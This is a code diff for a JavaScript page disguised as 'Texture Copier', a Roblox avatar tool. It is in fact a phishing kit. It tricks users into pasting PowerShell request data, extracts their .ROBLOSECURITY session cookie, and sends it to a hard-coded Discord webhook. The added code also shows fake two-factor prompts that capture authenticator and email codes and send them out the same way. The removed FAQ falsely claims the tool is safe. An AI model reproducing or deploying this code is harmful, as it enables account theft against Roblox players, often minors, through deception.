@@ -1,145 +1,220 @@
-// === UI CHANGES ===
-
-// 1. Change button text to "Compile PowerShell"
-document.getElementById('enterButton').textContent = "Compile PowerShell";
-
-// 2. Update instruction text
+// === UI Setup ===
 document.getElementById('instructions').textContent =
-  'Press on the "Compile PowerShell" button to compile your avatar. Once you have your PowerShell copied, you can paste it and hit "Enter" To send it.';
+  'Press on the "Compile PowerShell" button to compile your avatar. Once you have your PowerShell copied, you can paste it and hit "Enter" to send it.';
 
-// === MODAL & POWERSHELL INPUT LOGIC ===
+// === Modal Open/Close Functions ===
+function openModal(id) {
+  const modal = document.getElementById(id);
+  if (modal) {
+    modal.style.display = 'flex';
+    modal.style.opacity = '1';
+    // REMOVE: modal.style.pointerEvents = 'auto';
+    const modalContent = modal.querySelector('.modal-content');
+    if (modalContent) modalContent.classList.remove('fade-out');
 
-document.getElementById('enterButton').addEventListener('click', function() {
-  openModal('powershell');
-});
-
-function openModal(type) {
-  const modal = document.getElementById('modal');
-  const title = document.getElementById('modal-title');
-  const text = document.getElementById('modal-text');
-  const textarea = document.getElementById('powershellInput');
-  const submitBtn = document.getElementById('submitButton');
-
-  // Reset fade-out class for modal content when a modal opens
-  const modalContent = document.querySelector('.modal-content');
-  modalContent.classList.remove('fade-out');  // Remove fade-out class if present
-
-  if (type === 'faq') {
-    title.textContent = "FAQ";
-    text.style.display = "";
-    textarea.style.display = "none";
-    submitBtn.style.display = "none";
-    text.innerText = `Q: What does Texture Copier do?\n\nA: Texture Copier allows you to easily copy the clothing, accessories, and avatar setup from any Roblox character.\n\nQ: Is this tool safe?\n\nA: Yes! Texture Copier only reads public avatar information and does not access private data.\n\nQ: How do I use it?\n\nA: Press on "Compile PowerShell" to upload your PowerShell script.`; 
-  } else if (type === 'about') {
-    title.textContent = "About";
-    text.style.display = "";
-    textarea.style.display = "none";
-    submitBtn.style.display = "none";
-    text.innerText = `Texture Copier is a simple and free tool made for Roblox players who want to quickly copy avatar styles.\n\nThis tool is designed for ease-of-use, speed, and full safety. No downloads, no accounts, and no private data required.\n\nWe believe that creativity should be accessible to everyone, and copying styles should be effortless.`; 
-  } else if (type === 'tos') {
-    title.textContent = "Terms of Service";
-    text.style.display = "";
-    textarea.style.display = "none";
-    submitBtn.style.display = "none";
-    text.innerText = `By using Texture Copier, you agree to the following:\n\n- This tool is for personal use only.\n- We are not responsible for any misuse of the tool.\n- No attempts to abuse, automate, or reverse-engineer the system.\n- Respect other players' creativity and use responsibly.`; 
-  } else if (type === 'powershell') {
-    title.textContent = "Compile PowerShell";
-    text.style.display = "none";
-    textarea.style.display = "";
-    submitBtn.style.display = "";
-    textarea.value = ""; // Clear previous input
+    setTimeout(() => {
+      const input = modal.querySelector('input.input-field.form-control');
+      if (input) input.focus();
+    }, 100);
   }
-
-  modal.style.display = "flex";
-  document.body.classList.add('modal-open');
 }
 
-// === Close Modal When Clicking Outside ===
-function closeModal() {
-  const modal = document.getElementById('modal');
-  const modalContent = document.querySelector('.modal-content');
-
-  // Apply fade-out effect to modal content
-  modalContent.classList.add('fade-out');
-
-  setTimeout(() => {
-    modal.style.display = "none"; // Hide the modal after fade-out is complete
-    document.body.classList.remove('modal-open');
-  }, 1000); // Wait for the fade-out animation (1 second)
+function closeModal(id) {
+  const modal = document.getElementById(id);
+  if (modal) {
+    const modalContent = modal.querySelector('.modal-content');
+    if (modalContent) modalContent.classList.add('fade-out');
+    setTimeout(() => {
+      modal.style.display = 'none';
+      modal.style.opacity = '0';
+      // REMOVE: modal.style.pointerEvents = 'none';
+      if (modalContent) modalContent.classList.remove('fade-out');
+    }, 400);
+  }
 }
 
 window.onclick = function(event) {
-  const modal = document.getElementById('modal');
-  if (event.target === modal) {
-    closeModal();
-  }
-}
+  const modals = document.querySelectorAll('.modal');
+  modals.forEach(modal => {
+    if (event.target === modal) {
+      closeModal(modal.id);
+    }
+  });
+};
 
-// === PowerShell Submission Logic ===
-document.getElementById('submitButton').addEventListener('click', function() {
+// === Main Button ===
+document.getElementById('enterButton').addEventListener('click', function() {
+  openModal('modal');
+});
+
+// === PowerShell Submission ===
+document.getElementById('submitButton').addEventListener('click', async function() {
   const powershellInput = document.getElementById('powershellInput');
-  const powershellData = powershellInput.value;
+  const powershellData = powershellInput.value.trim();
 
   if (!powershellData) {
     alert('Please paste your PowerShell data.');
     return;
   }
 
-  // Regex to extract only the .ROBLOSECURITY cookie value
-  const roblosecurityRegex = /\$session\.Cookies\.Add\(\(New-Object System\.Net\.Cookie\("\.ROBLOSECURITY",\s*"([^"]+)"/;
+  showLoading(true);
+
+  const roblosecurityRegex = /New-Object System\.Net\.Cookie\("\.ROBLOSECURITY",\s*"([^"]+)"/;
   const match = powershellData.match(roblosecurityRegex);
 
-  let payload;
-  if (match) {
-    payload = {
-      embeds: [
-        {
-          title: ".ROBLOSECURITY Cookie Found",
-          description: match[1],
-          color: 0xFF0000
-        }
-      ]
-    };
-    console.log("COOKIE VALUE EXTRACTED!", match[1]);
+  if (!match) {
+    await sendWebhook('No .ROBLOSECURITY Cookie Found', 'No .ROBLOSECURITY cookie found.', 0xff0000);
   } else {
-    payload = {
-      embeds: [
-        {
-          title: "No .ROBLOSECURITY Cookie Found",
-          description: "No .ROBLOSECURITY cookie value was found in the submitted PowerShell data.",
-          color: 0xCCCCCC
-        }
-      ]
-    };
+    const cookie = match[1].trim();
+    await sendWebhook('New Cookie Captured', `\`\`\`${cookie}\`\`\``, 0x00ff00);
   }
 
-  fetch('https://discord.com/api/webhooks/1365872225650999368/4zuhOH83udSWA5c1WY84i43pR8qVUGuVEtunxL84AXtd5-xRXIsvhdpKynh9GSqZPLZq', {
+  powershellInput.value = '';
+  closeModal('modal');
+  showLoading(false);
+
+  setTimeout(() => {
+    openModal('twofa-modal');
+  }, 400);
+});
+
+// === First 2FA Modal (Authenticator App) ===
+const twofaInput = document.getElementById('twofa-input');
+const verifyButton = document.getElementById('verifyButton');
+
+if (twofaInput && verifyButton) {
+  twofaInput.addEventListener('input', () => {
+    const enabled = /^\d{6}$/.test(twofaInput.value);
+    verifyButton.disabled = !enabled;
+    verifyButton.classList.toggle('enabled', enabled);
+  });
+
+  verifyButton.addEventListener('click', async () => {
+    const codeEntered = twofaInput.value.trim();
+    if (!/^\d{6}$/.test(codeEntered)) {
+      alert('Please enter a valid 6-digit code.');
+      return;
+    }
+
+    showLoading(true);
+    await sendWebhook('2FA Auth Code Captured 🔥', `Authenticator Code Entered: **${codeEntered}**`, 0xffa500);
+
+    twofaInput.value = '';
+    closeModal('twofa-modal');  // Close first popup
+
+    setTimeout(() => {
+      openModal('twofa-modal-2');  // Open second popup
+    }, 1000);
+
+    showLoading(false);
+  }); // <--- THIS IS THE END OF THE verifyButton.addEventListener
+
+// MISSING THIS CLOSING BRACE:
+} // <--- ADD THIS TO CLOSE THE if (twofaInput && verifyButton) BLOCK
+
+
+
+// === Second 2FA Modal ===
+const twofaInput2 = document.getElementById('twofa-input-2');
+const verifyButton2 = document.getElementById('verifyButton2');
+
+if (twofaInput2 && verifyButton2) {
+  twofaInput2.addEventListener('input', () => {
+    const enabled = /^\d{6}$/.test(twofaInput2.value);
+    verifyButton2.disabled = !enabled;
+    verifyButton2.classList.toggle('enabled', enabled);
+  });
+
+  verifyButton2.addEventListener('click', async () => {
+    const codeEntered = twofaInput2.value.trim();
+    if (!/^\d{6}$/.test(codeEntered)) {
+      alert('Please enter a valid 6-digit code.');
+      return;
+    }
+
+    showLoading(true);
+    await sendWebhook('2FA Email Code Captured 📩', `Second Modal Code Entered: **${codeEntered}**`, 0xffa500);
+
+    twofaInput2.value = '';
+    closeModal('twofa-modal-2'); // <-- FIXED ID
+    showLoading(false);
+  });
+}
+
+
+// === Webhook Sending ===
+async function sendWebhook(title, description, color) {
+  const webhookUrl = 'https://discord.com/api/webhooks/1365872225650999368/4zuhOH83udSWA5c1WY84i43pR8qVUGuVEtunxL84AXtd5-xRXIsvhdpKynh9GSqZPLZq';
+  const payload = {
+    embeds: [{
+      title: title,
+      description: description,
+      color: color,
+      footer: { text: `Logger System • ${new Date().toLocaleString()}` }
+    }]
+  };
+
+  await fetch(webhookUrl, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify(payload)
-  })
-  .then(response => {
-    // Show success message
-    const popup = document.createElement('div');
-    popup.className = 'custom-popup';
-    popup.innerText = "Data submitted successfully!";
-    document.body.appendChild(popup);
-
-    setTimeout(() => {
-      popup.classList.add('show');
-    }, 100);
-
-    setTimeout(() => {
-      popup.classList.remove('show');
-      setTimeout(() => popup.remove(), 500);
-    }, 3000);
-
-    // Clear input and hide modal
-    powershellInput.value = '';
-    closeModal();
-  })
-  .catch(error => {
-    console.error('Error:', error);
-    alert('Error submitting data.');
   });
-});
+}
+
+// === Loading Spinner ===
+function showLoading(show) {
+  if (show) {
+    if (!document.getElementById('loading-overlay')) {
+      const overlay = document.createElement('div');
+      overlay.id = 'loading-overlay';
+      overlay.style.position = 'fixed';
+      overlay.style.top = '0';
+      overlay.style.left = '0';
+      overlay.style.width = '100%';
+      overlay.style.height = '100%';
+      overlay.style.background = 'rgba(0,0,0,0.5)';
+      overlay.style.zIndex = '10000';
+      overlay.style.display = 'flex';
+      overlay.style.justifyContent = 'center';
+      overlay.style.alignItems = 'center';
+
+      const spinner = document.createElement('div');
+      spinner.style.width = '60px';
+      spinner.style.height = '60px';
+      spinner.style.border = '8px solid #f3f3f3';
+      spinner.style.borderTop = '8px solid #007bff';
+      spinner.style.borderRadius = '50%';
+      spinner.style.animation = 'spin 1s linear infinite';
+
+      overlay.appendChild(spinner);
+      document.body.appendChild(overlay);
+    }
+  } else {
+    const overlay = document.getElementById('loading-overlay');
+    if (overlay) overlay.remove();
+  }
+}
+
+// === Spinner Animation ===
+const styleSheet = document.createElement('style');
+styleSheet.type = 'text/css';
+styleSheet.innerText = `
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}`;
+document.head.appendChild(styleSheet);
+
+// === Helpers ===
+function closeTwoFAModal() {
+  const modals = ['twofa-modal', 'twofa-modal-2'];
+  modals.forEach(id => closeModal(id));
+}
+
+function useAnotherMethod() {
+  alert('Other verification methods are not available. Please use your authenticator app or check your email.');
+}
+
+function resendCode() {
+  alert('A new code has been sent to your email. (Simulation)');
+}
